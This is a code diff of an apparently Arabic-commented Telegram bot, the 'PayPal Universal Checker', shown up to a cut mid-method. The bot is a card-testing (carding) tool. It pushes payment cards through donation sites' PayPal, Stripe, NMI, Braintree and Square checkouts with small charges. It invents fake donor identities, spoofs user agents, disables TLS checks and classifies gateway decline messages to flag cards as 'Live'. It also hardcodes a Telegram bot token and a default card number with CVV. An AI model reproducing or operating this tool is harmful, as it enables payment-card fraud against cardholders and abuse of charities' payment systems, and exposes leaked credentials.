@@ -1,172 +1,120 @@
+#!/usr/bin/env python3
+# -*- coding: utf-8 -*-
+"""
+PayPal Universal Checker — Telegram Bot (Final)
+- يدعم كل بوابات الدفع (PayPal / Stripe / NMI / Braintree / Square)
+- Price = المبلغ اللي نجح
+- كل ردود البوابات = Live
+"""
+
 import telebot
 import time
 import threading
-from telebot import types
-import requests, random, json, string, re, base64
-from datetime import datetime, timedelta
+import base64
+import requests
+import random
+import json
+import re
 import os
-import html
 import gc
-import sys
-from user_agent import generate_user_agent
-from requests_toolbelt.multipart.encoder import MultipartEncoder
-from urllib.parse import urlparse
-from concurrent.futures import ThreadPoolExecutor, as_completed
+from datetime import datetime
+from urllib.parse import urlparse, urljoin
+from telebot import types
+from bs4 import BeautifulSoup
 import urllib3
+
 urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 
-try:
-    from fake_useragent import UserAgent
-    uu = UserAgent()
-    HAS_FAKE_UA = True
-except:
-    HAS_FAKE_UA = False
-    class SimpleUA:
-        def __init__(self):
-            self.agents = [
-                'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
-                'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
-                'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
-                'Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1',
-                'Mozilla/5.0 (Linux; Android 14; Pixel 8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36',
-            ]
-        
-        def random(self):
-            return random.choice(self.agents)
 
-token = '8689698569:AAGg6oZqV6f6M-MgUS4SxO8rdkhP53n5e-k'
-bot = telebot.TeleBot(token, parse_mode="HTML")
-admin = 6843321125
-myid = ['6843321125']
-admins = ['6843321125']
+# ============ إعدادات البوت ============
+BOT_TOKEN = os.getenv('BOT_TOKEN', '8689698569:AAF6GOOcFdsTnG_UXXHLqWkis0bCsIFsQJQ')
+bot = telebot.TeleBot(BOT_TOKEN, parse_mode="HTML")
+
+ADMIN_ID = 6843321125
 OWNER_ID = 6843321125
+admins = ['6843321125']
 
 waiting_users = {}
 reply_mode = {}
 processing_status = {}
 
-error_counter = {
-    '502': 0,
-    '429': 0,
-    '500': 0,
-    'timeout': 0,
-    'connection': 0
+CONFIG = {
+    'card': {
+        'number': os.getenv('CARD_NUMBER', '5143772354638703'),
+        'month':  os.getenv('CARD_MONTH', '05'),
+        'year':   os.getenv('CARD_YEAR', '28'),
+        'cvv':    os.getenv('CARD_CVV', '886'),
+    },
+    'amounts': ['1.00', '5.00', '10.00'],
+    'timeout': 20,
+    'token_timeout': 8,
 }
+
+error_counter = {'502': 0, '429': 0, '500': 0, 'timeout': 0, 'connection': 0}
 
 if not os.path.exists('blockusers.txt'):
     with open('blockusers.txt', 'w') as f:
         f.write('')
 
-def track_error(error_type):
-    if error_type in error_counter:
-        error_counter[error_type] += 1
-        if error_counter[error_type] > 10:
-            print(f"⚠️ Too many {error_type} errors! Waiting 60s...")
+
+def track_error(etype):
+    if etype in error_counter:
+        error_counter[etype] += 1
+        if error_counter[etype] > 10:
             time.sleep(60)
-            error_counter[error_type] = 0
-    else:
-        for key in error_counter:
-            error_counter[key] = 0
+            error_counter[etype] = 0
+
 
 def reset_error_counter():
-    for key in error_counter:
-        error_counter[key] = 0
+    for k in error_counter:
+        error_counter[k] = 0
 
-def safe_edit_message(chat_id, message_id, text, parse_mode="HTML", retries=10):
-    for i in range(retries):
-        try:
-            result = bot.edit_message_text(chat_id=chat_id, message_id=message_id, text=text, parse_mode=parse_mode)
-            reset_error_counter()
-            return result
-        except Exception as e:
-            error_str = str(e)
-            
-            if "429" in error_str:
-                track_error('429')
-                try:
-                    wait_time = int(error_str.split("retry after ")[1].split(")")[0]) if "retry after" in error_str else 30
-                except:
-                    wait_time = 30
-                print(f"⏳ FloodWait (edit): {wait_time}s")
-                time.sleep(min(wait_time + 5, 65))
-                
-            elif "502" in error_str or "Bad Gateway" in error_str:
-                track_error('502')
-                wait_time = 5 * (i + 1)
-                print(f"⚠️ 502 Bad Gateway (edit) - attempt {i+1}/{retries}, waiting {wait_time}s...")
-                time.sleep(wait_time)
-                
-            elif "500" in error_str or "Internal Server Error" in error_str:
-                track_error('500')
-                wait_time = 3 * (i + 1)
-                print(f"⚠️ 500 Error (edit) - attempt {i+1}/{retries}, waiting {wait_time}s...")
-                time.sleep(wait_time)
-                
-            elif "Timed out" in error_str or "timeout" in error_str.lower():
-                track_error('timeout')
-                wait_time = 2 * (i + 1)
-                print(f"⚠️ Timeout (edit) - attempt {i+1}/{retries}, waiting {wait_time}s...")
-                time.sleep(wait_time)
-                
-            elif "Connection" in error_str or "ConnectionError" in error_str:
-                track_error('connection')
-                wait_time = 3 * (i + 1)
-                print(f"⚠️ Connection Error (edit) - attempt {i+1}/{retries}, waiting {wait_time}s...")
-                time.sleep(wait_time)
-                
-            else:
-                print(f"❌ Error (edit): {error_str[:100]}")
-                break
-    return None
 
-def safe_send_message(chat_id, text, parse_mode="HTML", retries=10, reply_markup=None):
+def safe_send_message(chat_id, text, parse_mode="HTML", retries=5, reply_markup=None):
     for i in range(retries):
         try:
             result = bot.send_message(chat_id, text, parse_mode=parse_mode, reply_markup=reply_markup)
             reset_error_counter()
             return result
         except Exception as e:
-            error_str = str(e)
-            
-            if "429" in error_str:
-                track_error('429')
+            err = str(e)
+            if "429" in err:
                 try:
-                    wait_time = int(error_str.split("retry after ")[1].split(")")[0]) if "retry after" in error_str else 30
+                    w = int(err.split("retry after ")[1].split(")")[0])
                 except:
-                    wait_time = 30
-                print(f"⏳ FloodWait (msg): {wait_time}s")
-                time.sleep(min(wait_time + 5, 65))
-                
-            elif "502" in error_str or "Bad Gateway" in error_str:
-                track_error('502')
-                wait_time = 5 * (i + 1)
-                print(f"⚠️ 502 Bad Gateway (msg) - attempt {i+1}/{retries}, waiting {wait_time}s...")
-                time.sleep(wait_time)
-                
-            elif "500" in error_str or "Internal Server Error" in error_str:
-                track_error('500')
-                wait_time = 3 * (i + 1)
-                print(f"⚠️ 500 Error (msg) - attempt {i+1}/{retries}, waiting {wait_time}s...")
-                time.sleep(wait_time)
-                
-            elif "Timed out" in error_str or "timeout" in error_str.lower():
-                track_error('timeout')
-                wait_time = 2 * (i + 1)
-                print(f"⚠️ Timeout (msg) - attempt {i+1}/{retries}, waiting {wait_time}s...")
-                time.sleep(wait_time)
-                
-            elif "Connection" in error_str or "ConnectionError" in error_str:
-                track_error('connection')
-                wait_time = 3 * (i + 1)
-                print(f"⚠️ Connection Error (msg) - attempt {i+1}/{retries}, waiting {wait_time}s...")
-                time.sleep(wait_time)
-                
+                    w = 30
+                time.sleep(min(w + 5, 65))
+            elif "502" in err or "500" in err:
+                time.sleep(3 * (i + 1))
             else:
-                print(f"❌ Error (msg): {error_str[:100]}")
                 break
     return None
 
-def safe_send_document(chat_id, file_path, caption="", parse_mode="HTML", retries=10):
+
+def safe_edit_message(chat_id, message_id, text, parse_mode="HTML", retries=5):
+    for i in range(retries):
+        try:
+            result = bot.edit_message_text(chat_id=chat_id, message_id=message_id, text=text, parse_mode=parse_mode)
+            reset_error_counter()
+            return result
+        except Exception as e:
+            err = str(e)
+            if "message is not modified" in err.lower():
+                return None
+            if "429" in err:
+                try:
+                    w = int(err.split("retry after ")[1].split(")")[0])
+                except:
+                    w = 30
+                time.sleep(min(w + 5, 65))
+            elif "502" in err or "500" in err:
+                time.sleep(3 * (i + 1))
+            else:
+                break
+    return None
+
+
+def safe_send_document(chat_id, file_path, caption="", parse_mode="HTML", retries=5):
     for i in range(retries):
         try:
             with open(file_path, 'rb') as f:
@@ -174,118 +122,43 @@ def safe_send_document(chat_id, file_path, caption="", parse_mode="HTML", retrie
             reset_error_counter()
             return result
         except Exception as e:
-            error_str = str(e)
-            
-            if "429" in error_str:
-                track_error('429')
-                try:
-                    wait_time = int(error_str.split("retry after ")[1].split(")")[0]) if "retry after" in error_str else 30
-                except:
-                    wait_time = 30
-                print(f"⏳ FloodWait (send): {wait_time}s")
-                time.sleep(min(wait_time + 5, 65))
-                
-            elif "502" in error_str or "Bad Gateway" in error_str:
-                track_error('502')
-                wait_time = 5 * (i + 1)
-                print(f"⚠️ 502 Bad Gateway (send) - attempt {i+1}/{retries}, waiting {wait_time}s...")
-                time.sleep(wait_time)
-                
-            elif "500" in error_str or "Internal Server Error" in error_str:
-                track_error('500')
-                wait_time = 3 * (i + 1)
-                print(f"⚠️ 500 Error (send) - attempt {i+1}/{retries}, waiting {wait_time}s...")
-                time.sleep(wait_time)
-                
-            elif "Timed out" in error_str or "timeout" in error_str.lower():
-                track_error('timeout')
-                wait_time = 2 * (i + 1)
-                print(f"⚠️ Timeout (send) - attempt {i+1}/{retries}, waiting {wait_time}s...")
-                time.sleep(wait_time)
-                
-            elif "Connection" in error_str or "ConnectionError" in error_str:
-                track_error('connection')
-                wait_time = 3 * (i + 1)
-                print(f"⚠️ Connection Error (send) - attempt {i+1}/{retries}, waiting {wait_time}s...")
-                time.sleep(wait_time)
-                
+            err = str(e)
+            if "429" in err:
+                time.sleep(30)
+            elif "502" in err or "500" in err:
+                time.sleep(3 * (i + 1))
             else:
-                print(f"❌ Error (send): {error_str[:100]}")
                 break
     return None
 
-def safe_get_file(file_id, retries=10):
+
+def safe_get_file(file_id, retries=5):
     for i in range(retries):
         try:
-            result = bot.get_file(file_id)
-            reset_error_counter()
-            return result
+            return bot.get_file(file_id)
         except Exception as e:
-            error_str = str(e)
-            
-            if "502" in error_str or "Bad Gateway" in error_str:
-                track_error('502')
-                wait_time = 5 * (i + 1)
-                print(f"⚠️ 502 in get_file - attempt {i+1}, waiting {wait_time}s...")
-                time.sleep(wait_time)
-                
-            elif "429" in error_str:
-                track_error('429')
-                wait_time = 30
-                try:
-                    wait_time = int(error_str.split("retry after ")[1].split(")")[0])
-                except:
-                    pass
-                print(f"⏳ FloodWait in get_file: {wait_time}s")
-                time.sleep(min(wait_time, 60))
-                
-            elif "500" in error_str:
-                track_error('500')
-                wait_time = 3 * (i + 1)
-                print(f"⚠️ 500 in get_file - attempt {i+1}, waiting {wait_time}s...")
-                time.sleep(wait_time)
-                
+            if "502" in str(e) or "429" in str(e) or "500" in str(e):
+                time.sleep(3 * (i + 1))
             else:
-                print(f"❌ Error in get_file: {error_str[:100]}")
                 break
     return None
 
-def safe_download_file(file_path, retries=10):
+
+def safe_download_file(file_path, retries=5):
     for i in range(retries):
         try:
-            result = bot.download_file(file_path)
-            reset_error_counter()
-            return result
+            return bot.download_file(file_path)
         except Exception as e:
-            error_str = str(e)
-            
-            if "502" in error_str or "Bad Gateway" in error_str:
-                track_error('502')
-                wait_time = 5 * (i + 1)
-                print(f"⚠️ 502 in download - attempt {i+1}, waiting {wait_time}s...")
-                time.sleep(wait_time)
-                
-            elif "429" in error_str:
-                track_error('429')
-                wait_time = 30
-                try:
-                    wait_time = int(error_str.split("retry after ")[1].split(")")[0])
-                except:
-                    pass
-                print(f"⏳ FloodWait in download: {wait_time}s")
-                time.sleep(min(wait_time, 60))
-                
-            elif "500" in error_str:
-                track_error('500')
-                wait_time = 3 * (i + 1)
-                print(f"⚠️ 500 in download - attempt {i+1}, waiting {wait_time}s...")
-                time.sleep(wait_time)
-                
+            if "502" in str(e) or "429" in str(e) or "500" in str(e):
+                time.sleep(3 * (i + 1))
             else:
-                print(f"❌ Error in download: {error_str[:100]}")
                 break
     return None
 
+
+# ============================================================
+# 🌐 ردود كل بوابات الدفع
+# ============================================================
 PAYPAL_RESPONSES = [
     'Payer cannot pay', 'INSUFFICIENT_FUNDS', 'ORDER_NOT_APPROVED',
     'TRANSACTION_REFUSED', 'PAYER_ACTION_REQUIRED', 'INSTRUMENT_DECLINED',
@@ -293,871 +166,889 @@ PAYPAL_RESPONSES = [
     'EXPIRED_CARD', 'INVALID_PAYMENT_METHOD', 'DO_NOT_HONOR',
     'ACCOUNT_CLOSED', 'LOST_OR_STOLEN', 'CVV2_FAILURE',
     'SUSPECTED_FRAUD', 'INVALID_ACCOUNT', 'REATTEMPT_NOT_PERMITTED',
-    'ACCOUNT_BLOCKED_BY_ISSUER', 'PICKUP_CARD_SPECIAL_CONDITIONS',
-    'GENERIC_DECLINE', 'COMPLIANCE_VIOLATION', 'TRANSACTION_NOT_PERMITTED',
-    'INVALID_TRANSACTION', 'RESTRICTED_OR_INACTIVE_ACCOUNT',
-    'SECURITY_VIOLATION', 'DECLINED_DUE_TO_UPDATED_ACCOUNT',
-    'INVALID_OR_RESTRICTED_CARD', 'EXPIRED_CREDIT_CARD', 'CRYPTOGRAPHIC_FAILURE',
-    'TRANSACTION_CANNOT_BE_COMPLETED', 'DECLINED_PLEASE_RETRY',
-    'TX_ATTEMPTS_EXCEED_LIMIT', 'PAYER_ACCOUNT_LOCKED_OR_CLOSED',
-    'DECLINED', 'CHARGE', 'UNPROCESSABLE_ENTITY', 'VALIDATION_ERROR',
-    'INVALID_REQUEST', 'AUTHENTICATION_FAILURE', 'NOT_AUTHORIZED',
-    'NOT_ENABLED_FOR_CARD_PROCESSING', 'CARD_TYPE_NOT_SUPPORTED',
-    'MERCHANT_NOT_ENABLED', 'PAYEE_NOT_ENABLED_FOR_CARD_PROCESSING',
-    'INVALID_CURRENCY', 'CURRENCY_NOT_SUPPORTED', 'AMOUNT_MISMATCH',
-    'ITEM_TOTAL_MISMATCH', 'TAX_TOTAL_MISMATCH', 'SHIPPING_TOTAL_MISMATCH',
-    'HANDLING_TOTAL_MISMATCH', 'INSURANCE_TOTAL_MISMATCH', 'SHIPPING_DISCOUNT_MISMATCH',
-    'INVALID_PAYER_ID', 'INVALID_PAYEE_ID', 'INVALID_RESOURCE_ID',
-    'INVALID_PARAMETER', 'INVALID_PARAMETER_SYNTAX', 'INVALID_STRING_LENGTH',
-    'INVALID_STRING_FORMAT', 'MISSING_REQUIRED_PARAMETER', 'DUPLICATE_REQUEST_ID',
-    'DUPLICATE_INVOICE_ID', 'MAX_NUMBER_OF_PAYMENT_ATTEMPTS_EXCEEDED',
-    'PAYEE_ACCOUNT_RESTRICTED', 'PAYEE_ACCOUNT_INVALID', 'PAYEE_ACCOUNT_LOCKED_OR_CLOSED',
-    'PAYEE_BLOCKED_TRANSACTION', 'PAYER_BLOCKED_TRANSACTION', 'PAYER_ACCOUNT_RESTRICTED',
-    'PAYER_ACCOUNT_INVALID', 'UNSUPPORTED_INTENT', 'UNSUPPORTED_PAYMENT_INSTRUMENT',
-    'UNSUPPORTED_SHIPPING_TYPE', 'SHIPPING_ADDRESS_INVALID', 'SHIPPING_OPTION_NOT_SUPPORTED',
-    'MULTIPLE_SHIPPING_ADDRESS_NOT_SUPPORTED', 'MULTIPLE_SHIPPING_OPTION_SELECTED',
-    'INVALID_PICKUP_ADDRESS', 'PICKUP_ADDRESS_INVALID', 'INVALID_SHIPPING_ADDRESS',
-    'AUTHORIZATION_VOIDED', 'AUTHORIZATION_EXPIRED', 'AUTHORIZATION_DENIED',
-    'AUTHORIZATION_CAPTURED', 'CAPTURE_FULLY_REFUNDED', 'CAPTURE_PARTIALLY_REFUNDED',
-    'REFUND_NOT_PERMITTED', 'REFUND_DENIED', 'REFUND_FAILED',
-    'TRANSACTION_ALREADY_REFUNDED', 'TRANSACTION_LIMIT_EXCEEDED',
-    'BILLING_AGREEMENT_NOT_FOUND', 'BILLING_AGREEMENT_CANCELLED',
-    'BILLING_AGREEMENT_EXPIRED', 'BILLING_AGREEMENT_FAILED',
-    'INTERNAL_SERVER_ERROR', 'SERVICE_UNAVAILABLE', 'RESOURCE_NOT_FOUND',
-    'METHOD_NOT_ALLOWED', 'NOT_ACCEPTABLE', 'UNSUPPORTED_MEDIA_TYPE',
-    'RATE_LIMIT_REACHED', 'INSUFFICIENT_PERMISSIONS', 'INVALID_ACCESS_TOKEN',
-    'EXPIRED_ACCESS_TOKEN', 'MALFORMED_REQUEST', 'UNKNOWN_ERROR',
+    'ACCOUNT_BLOCKED_BY_ISSUER', 'GENERIC_DECLINE', 'COMPLIANCE_VIOLATION',
+    'TRANSACTION_NOT_PERMITTED', 'INVALID_TRANSACTION', 'RESTRICTED_OR_INACTIVE_ACCOUNT',
+    'SECURITY_VIOLATION', 'INVALID_OR_RESTRICTED_CARD', 'EXPIRED_CREDIT_CARD',
+    'TRANSACTION_CANNOT_BE_COMPLETED', 'DECLINED', 'CHARGE',
+    'AUTHENTICATION_FAILURE', 'NOT_AUTHORIZED', 'CARD_TYPE_NOT_SUPPORTED',
+    'INVALID_CURRENCY', 'AUTHORIZATION_DENIED', 'REFUND_DENIED',
+    'INTERNAL_SERVER_ERROR', 'SERVICE_UNAVAILABLE', 'RATE_LIMIT_REACHED',
+    'PAYER_ACCOUNT_RESTRICTED', 'PAYEE_ACCOUNT_RESTRICTED',
+    'PAYMENT_SOURCE_INFO_CANNOT_BE_VERIFIED', 'PAYMENT_SOURCE_DECLINED_BY_PROCESSOR',
+    'CURRENCY_NOT_SUPPORTED', 'AMOUNT_MISMATCH', 'MAX_NUMBER_OF_PAYMENT_ATTEMPTS_EXCEEDED',
 ]
 
+STRIPE_RESPONSES = [
+    'Your card was declined',
+    'Your card was declined.',
+    'Your card has insufficient funds',
+    'Your card has insufficient funds.',
+    'Your card does not support this type of purchase',
+    'Your card\'s security code is incorrect',
+    'Your card\'s expiration date is incorrect',
+    'Your card number is incorrect',
+    'Your card has expired',
+    'insufficient funds',
+    'Insufficient funds',
+    'card was declined',
+    'card declined',
+    'card has expired',
+    'card does not support',
+    'There was an issue with your donation transaction',
+    'Please check your payment method',
+    'contact your card issuer',
+    'try a different payment method',
+    'contact the site administrators',
+    'card_declined', 'insufficient_funds', 'lost_card', 'stolen_card',
+    'expired_card', 'incorrect_cvc', 'incorrect_number', 'invalid_number',
+    'processing_error', 'card_not_supported', 'currency_not_supported',
+    'fraudulent', 'generic_decline', 'authentication_required',
+    'balance_insufficient', 'pickup_card', 'restricted_card',
+    'security_violation', 'service_not_allowed', 'transaction_not_allowed',
+]
+
+NMI_RESPONSES = [
+    'DECLINE', 'APPROVED', 'APPROVAL', 'CALL', 'CALL CENTER',
+    'HOLD', 'PICK UP CARD', 'PICKUP', 'PICK UP',
+    'RE-ENTER', 'REENTER', 'RETAIN CARD', 'RETAIN',
+    'REFERRAL', 'REFER', 'INVALID CARD', 'INVALID CARD NUMBER',
+    'INVALID EXPIRATION', 'EXPIRED CARD',
+    'INVALID CVV', 'CVV FAILURE', 'CVV MISMATCH', 'NO MATCH',
+    'STOLEN CARD', 'LOST CARD', 'FRAUD', 'FRAUDULENT',
+    'INSUFFICIENT FUNDS', 'INSUFFICIENT', 'OVER LIMIT',
+    'OVERLIMIT', 'LIMIT EXCEEDED', 'TRANSACTION NOT ALLOWED',
+    'TRANSACTION NOT PERMITTED', 'RESTRICTED CARD',
+    'CARD NOT SUPPORTED', 'CURRENCY NOT SUPPORTED',
+    'DECLINED BY ISSUER', 'ISSUER DECLINED', 'ISSUER UNAVAILABLE',
+    'TIMEOUT', 'TIMED OUT', 'SYSTEM ERROR', 'SYSTEM MALFUNCTION',
+    'PROCESSOR DECLINE', 'PROCESSOR ERROR', 'GATEWAY ERROR',
+    'INVALID AMOUNT', 'INVALID ACCOUNT',
+    'INVALID MERCHANT', 'MERCHANT ERROR', 'DUPLICATE',
+    'DUPLICATE TRANSACTION', 'VOID', 'REFUND', 'CREDIT',
+    'AUTH ONLY', 'PRE-AUTH', 'POST-AUTH', 'SETTLE',
+    'DECLINED', 'ERROR', 'FAILED', 'FAILURE', 'UNKNOWN',
+    'GENERAL', 'GENERIC DECLINE', 'REFERRAL',
+]
+
+BRAINTREE_RESPONSES = [
+    'Do Not Honor', 'Insufficient Funds', 'Incorrect CVV',
+    'Invalid Card Number', 'Card Issuer Declined CVV',
+    'Card Declined', 'Cardholder Not Found', 'Card Expired',
+    'Card Not Supported', 'CVV Not Verified', 'Processor Declined',
+    'Fraud', 'Declined', 'Call Issuer', 'Lost or Stolen Card',
+    'Issuer Unavailable', 'Card Not Activated', 'Card Not Permitted',
+    'Card Type Not Accepted', 'Card Type Not Supported',
+    'Invalid Expiration Date', 'Card Account Length Error',
+    'No such issuer', 'Issuer Declined', 'Invalid CVV',
+    'Restricted Card', 'Processor Network Unavailable',
+    'gateway_rejected', 'processor_declined', 'settlement_declined',
+    'settlement_pending', 'authorization_expired', 'authorization_voided',
+    'authorization_captured', 'authorization_pending', 'authorized',
+    'settled', 'settling', 'settlement_confirmed', 'submitted_for_settlement',
+    'voided', 'processor_gateway_rejected',
+]
+
+SQUARE_RESPONSES = [
+    'CARD_DECLINED', 'INSUFFICIENT_FUNDS', 'CVV_FAILURE',
+    'ADDRESS_VERIFICATION_FAILURE', 'INVALID_EXPIRATION',
+    'EXPIRED_CARD', 'CARD_NOT_SUPPORTED', 'INVALID_CARD',
+    'INVALID_CARD_NUMBER', 'INVALID_CVV', 'INVALID_EXPIRATION_DATE',
+    'INVALID_POSTAL_CODE', 'CARDHOLDER_NAME_MISMATCH',
+    'INVALID_ACCOUNT', 'INVALID_AMOUNT', 'INVALID_LOCATION',
+    'INVALID_NONCE', 'INVALID_PAYMENT', 'INVALID_REQUEST',
+    'PAYMENT_LIMIT_EXCEEDED', 'GENERIC_DECLINE',
+    'TRANSACTION_LIMIT_EXCEEDED', 'VOICE_FAILURE',
+    'CARD_EXPIRED', 'CARD_DECLINED_VERIFICATION_REQUIRED',
+    'POSTAL_CODE_FAILURE', 'STREET_ADDRESS_FAILURE',
+    'MANUALLY_ENTERED_PAYMENT_NOT_SUPPORTED',
+    'REFUND_DECLINED', 'REFUND_ERROR', 'REFUND_FAILED',
+    'UNAUTHORIZED', 'FORBIDDEN', 'NOT_FOUND', 'METHOD_NOT_ALLOWED',
+    'CONFLICT', 'REQUEST_TIMEOUT', 'TOO_MANY_REQUESTS',
+    'INTERNAL_SERVER_ERROR', 'BAD_GATEWAY', 'SERVICE_UNAVAILABLE',
+    'GATEWAY_TIMEOUT',
+]
+
+# ✅ اللي يدل على DEAD / ERROR فقط
 DEAD_RESPONSES = [
     'invalid_client', 'Client Authentication failed', 'invalid_grant',
-    'unsupported_grant_type', 'invalid_scope', 'Create Order Failed',
-    'Invalid card format', 'No form fields', 'No au', 'No PayPal data',
-    'Connection failed', 'Decode error', 'Invalid URL', 'Error:',
-    'name', 'UserAgent', 'ImportError', 'Expecting value',
+    'unsupported_grant_type', 'invalid_scope',
+    'Invalid card format', 'No form fields', 'No PayPal data',
+    'Connection failed', 'Decode error', 'Invalid URL',
+    'ImportError', 'Expecting value', 'INVALID_GATEWAY',
+    'No supported gateway', 'No response from server',
+    'No PayPal/GiveWP detected',
 ]
 
-class PayPalCommerce:
-    def __init__(self, target_url=None):
-        self.first_name = [
-            "James", "John", "Robert", "Michael", "William", "David", "Richard", "Joseph", "Thomas", "Charles",
-            "Roger", "Noah", "Daniel", "Matthew", "Anthony", "Mark", "Steven", "Paul", "Andrew", "Joshua",
-            "Kevin", "Brian", "Edward", "George", "Ronald", "Teresa", "Mary", "Patricia", "Jennifer", "Linda",
-            "Elizabeth", "Barbara", "Susan", "Jessica", "Sarah", "Karen", "Nancy", "Lisa", "Betty", "Margaret",
-            "Sandra", "Ashley", "Kimberly", "Emily", "Donna", "Michelle", "Carol", "Amanda", "Dorothy", "Melissa",
-            "Deborah", "Stephanie", "Rebecca", "Sharon", "Laura", "Cynthia", "Kathleen", "Amy", "Angela", "Shirley"
-        ]
-        self.last_name = [
-            "Smith", "Johnson", "Williams", "Brown", "Jones", "Garcia", "Miller", "Davis", "Rodriguez", "Martinez",
-            "Morgan", "Wilson", "Anderson", "Taylor", "Thomas", "Moore", "Jackson", "Martin", "Lee", "Thompson",
-            "White", "Harris", "Clark", "Lewis", "Walker", "Rath", "Hall", "Allen", "Young", "Hernandez",
-            "King", "Wright", "Lopez", "Hill", "Scott", "Green", "Adams", "Baker", "Gonzalez", "Nelson",
-            "Carter", "Mitchell", "Perez", "Roberts", "Turner", "Phillips", "Campbell", "Parker", "Evans", "Edwards"
-        ]
-        self.donation = "1.00"
-        self.minimum_amount = "1.00"
-        self.currency = "USD"
-        self.r = requests.Session()
-        self.r.verify = False
-        self.r.headers.update({'Accept': 'application/json', 'Accept-Language': 'en-US,en;q=0.9'})
-        self.uu = UserAgent() if HAS_FAKE_UA else SimpleUA()
+ALL_GATEWAY_RESPONSES = (
+    PAYPAL_RESPONSES + STRIPE_RESPONSES + NMI_RESPONSES +
+    BRAINTREE_RESPONSES + SQUARE_RESPONSES
+)
+
+# ============ قوائم عشوائية ============
+USER_AGENTS = [
+    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
+    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
+    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
+]
+
+FIRST_NAMES = ["James", "John", "Robert", "Michael", "William", "David", "Richard",
+               "Mary", "Patricia", "Jennifer", "Linda", "Elizabeth", "Barbara"]
+LAST_NAMES = ["Smith", "Johnson", "Williams", "Brown", "Jones", "Garcia", "Miller",
+              "Davis", "Rodriguez", "Martinez", "Wilson", "Anderson"]
+STREETS = ["Main Street", "Oak Avenue", "Maple Drive", "Park Road", "Elm Street"]
+CITIES = [("New York", "NY", "10001"), ("Los Angeles", "CA", "90001"),
+          ("Chicago", "IL", "60601"), ("Houston", "TX", "77001"),
+          ("Miami", "FL", "33101"), ("Seattle", "WA", "98101")]
+
+
+def random_ua():
+    return random.choice(USER_AGENTS)
+
+
+def gen_data():
+    fn = random.choice(FIRST_NAMES)
+    ln = random.choice(LAST_NAMES)
+    city, state, zipc = random.choice(CITIES)
+    return {
+        'first_name': fn, 'last_name': ln, 'full_name': f"{fn} {ln}",
+        'email': f"{fn.lower()}.{ln.lower()}{random.randint(10,999)}@{random.choice(['gmail.com','yahoo.com','outlook.com'])}",
+        'phone': f"{random.randint(200,999)}{random.randint(100,999)}{random.randint(1000,9999)}",
+        'address': f"{random.randint(100,9999)} {random.choice(STREETS)}",
+        'address2': 'Apt 4B',
+        'city': city, 'state': state, 'zip': zipc, 'country': 'US',
+    }
+
+
+# ============================================================
+# محرك الفحص
+# ============================================================
+class PayPalChecker:
+    def __init__(self, target_url):
+        self.target_url = target_url
+        self.parsed = urlparse(target_url)
+        self.domain = self.parsed.netloc
+        self.scheme = self.parsed.scheme or 'https'
+        self.path = self.parsed.path or '/'
+        if self.parsed.query:
+            self.path += f"?{self.parsed.query}"
+
+        self.data = gen_data()
+        self.session = requests.Session()
+        self.session.verify = False
+        self.session.headers.update({
+            'Accept': 'application/json, text/javascript, */*; q=0.01',
+            'Accept-Language': 'en-US,en;q=0.9',
+            'User-Agent': random_ua(),
+        })
+
         self.client_id = None
         self.access_token = None
         self.client_token = None
         self.form_data = {}
         self.ajax_url = None
-        self.cookies = {}
-        self.target_url = target_url if target_url else 'https://www.sandiegoyokohamasistercity.org/donations/donation-form/'
-        self.url = urlparse(self.target_url).netloc
-        self.inurl = urlparse(self.target_url).path
-        if urlparse(self.target_url).query:
-            self.inurl += f"?{urlparse(self.target_url).query}"
-        self.email = f"{random.choice(self.first_name)}{random.randint(100,999)}@gmail.com"
-        self.is_valid_gateway = True
         self.gateway_type = 'paypal-commerce'
-        self.is_woocommerce = False
-        self.paypal_responses = PAYPAL_RESPONSES.copy()
-        self.user_agents = [
-            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
-            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
-            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
-            'Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1',
-            'Mozilla/5.0 (Linux; Android 14; Pixel 8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36',
-            'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:120.0) Gecko/20100101 Firefox/120.0'
-        ]
-        self.ua_index = 0
-        self.TIMEOUT = 13
-        self._init_and_extract()
-        self._get_access_token()
-        self._get_client_token()
+        self.form_id = None
+        self.form_hash = None
+        self.form_id_prefix = None
+        self.nonces = []
+        self.actions = []
+        self.is_valid = False
+        self.detected_gateways = []
+        self.raw_html = ""
+        self._last_response = ""
+        self.decoded_strings = []
+        self.sub_pages = []
+        self.currency = 'USD'
+        self.donation_levels = []
 
-    def get_next_ua(self):
-        try:
-            return self.uu.random
-        except:
-            ua = self.user_agents[self.ua_index % len(self.user_agents)]
-            self.ua_index += 1
-            return ua
+    def log(self, msg):
+        pass
 
-    def get_address_data(self):
-        return {
-            'give-address1': '123 Main Street', 'give-address2': 'Apt 4B',
-            'give_Address2': 'Apt 4B', 'give-address_2': 'Apt 4B',
-            'give_address2': 'Apt 4B', 'give_address_2': 'Apt 4B',
